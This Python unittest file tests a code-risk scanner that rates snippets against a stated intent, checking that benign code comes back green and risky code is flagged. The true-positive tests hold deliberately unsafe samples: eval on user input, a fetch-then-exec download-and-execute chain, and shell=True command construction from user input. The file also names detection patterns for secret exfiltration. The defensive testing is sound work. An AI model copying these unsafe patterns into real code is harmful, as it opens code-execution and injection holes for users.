import unittest

from main import analyze_code


class ScannerFalsePositiveTests(unittest.TestCase):
    def assert_green(self, intent: str, code: str):
        result = analyze_code(intent, code)
        self.assertEqual(result["risk"], "green", result)
        self.assertGreaterEqual(result["trust_score"], 90, result)
        return result

    def test_comments_are_not_executable_code(self):
        result = self.assert_green(
            "Print a short greeting",
            "# Never call eval(user_input) or subprocess here.\nprint('hello')",
        )
        self.assertEqual(result["flags"], [])

    def test_python_docstrings_are_not_executable_code(self):
        result = self.assert_green(
            "Return a constant value from a documented helper",
            'def helper():\n    """Do not call eval(user_input)."""\n    return True',
        )
        self.assertEqual(result["flags"], [])

    def test_fixed_https_get_is_normal_api_behavior(self):
        result = self.assert_green(
            "Fetch public JSON from an API over HTTPS",
            'import requests\nresponse = requests.get("https://example.com/data", timeout=10)',
        )
        self.assertNotIn("requests.get", {flag["pattern"] for flag in result["flags"]})

    def test_javascript_fetch_is_not_a_risk_by_itself(self):
        result = self.assert_green(
            "Fetch public JSON from an API over HTTPS",
            'const response = await fetch("https://example.com/data");',
        )
        self.assertNotIn("fetch(", {flag["pattern"] for flag in result["flags"]})

    def test_fixed_subprocess_argument_list_is_low_risk(self):
        result = self.assert_green(
            "Run the fixed git status command in a local CLI",
            'import subprocess\nsubprocess.run(["git", "status"], check=True)',
        )
        self.assertNotIn("download_execute_chain", {flag["pattern"] for flag in result["flags"]})

    def test_fixed_subprocess_variable_is_low_risk(self):
        result = self.assert_green(
            "Run the fixed git status command in a local CLI",
            'import subprocess\ncommand = ["git", "status"]\nsubprocess.run(command, check=True)',
        )
        self.assertLessEqual(result["risk_points"], 5)

    def test_non_execution_subprocess_helper_is_not_flagged(self):
        result = self.assert_green(
            "Format a fixed command line for display",
            'import subprocess\ntext = subprocess.list2cmdline(["git", "status"])',
        )
        self.assertNotIn("subprocess", {flag["pattern"] for flag in result["flags"]})

    def test_safe_yaml_loader_is_not_reported_as_unsafe(self):
        result = self.assert_green(
            "Load a local YAML config using SafeLoader",
            'import yaml\nwith open("config.yml") as stream:\n    config = yaml.load(stream, Loader=yaml.SafeLoader)',
        )
        self.assertNotIn("yaml.load", {flag["pattern"] for flag in result["flags"]})

    def test_expected_https_authentication_is_not_called_exfiltration(self):
        result = self.assert_green(
            "Call the OpenAI API using an environment credential for authentication",
            'import os, requests\ntoken = os.getenv("OPENAI_API_KEY")\nrequests.post("https://api.openai.com/v1/responses", headers={"Authorization": f"Bearer {token}"})',
        )
        patterns = {flag["pattern"] for flag in result["flags"]}
        self.assertIn("credential_authentication", patterns)
        self.assertNotIn("secret_exfiltration_chain", patterns)

    def test_unrelated_network_and_fixed_process_calls_do_not_form_a_chain(self):
        result = self.assert_green(
            "Fetch API data and separately run a fixed local git command",
            'import requests, subprocess\nrequests.get("https://example.com/data")\nsubprocess.run(["git", "status"], check=True)',
        )
        self.assertNotIn("download_execute_chain", {flag["pattern"] for flag in result["flags"]})


class ScannerTruePositiveTests(unittest.TestCase):
    def test_tainted_eval_is_high_risk(self):
        result = analyze_code(
            "Display user input",
            'value = input("Value: ")\nresult = eval(value)\nprint(result)',
        )
        self.assertEqual(result["risk"], "red", result)
        self.assertIn("eval(", {flag["pattern"] for flag in result["flags"]})

    def test_downloaded_content_executed_is_high_risk(self):
        result = analyze_code(
            "Download JSON for display",
            'import requests\npayload = requests.get("https://example.com/payload").text\nexec(payload)',
        )
        self.assertEqual(result["risk"], "red", result)
        self.assertIn("download_execute_chain", {flag["pattern"] for flag in result["flags"]})

    def test_shell_true_with_user_input_is_high_risk(self):
        result = analyze_code(
            "Print the requested filename",
            'import subprocess\nfilename = input("File: ")\nsubprocess.run(f"cat {filename}", shell=True)',
        )
        self.assertEqual(result["risk"], "red", result)
        self.assertIn("subprocess", {flag["pattern"] for flag in result["flags"]})

    def test_user_controlled_fetch_destination_requires_review(self):
        result = analyze_code(
            "Render a local status message",
            "const response = await fetch(request.url);",
        )
        self.assertIn(result["risk"], {"yellow", "red"}, result)
        self.assertIn("fetch(", {flag["pattern"] for flag in result["flags"]})


if __name__ == "__main__":
    unittest.main()
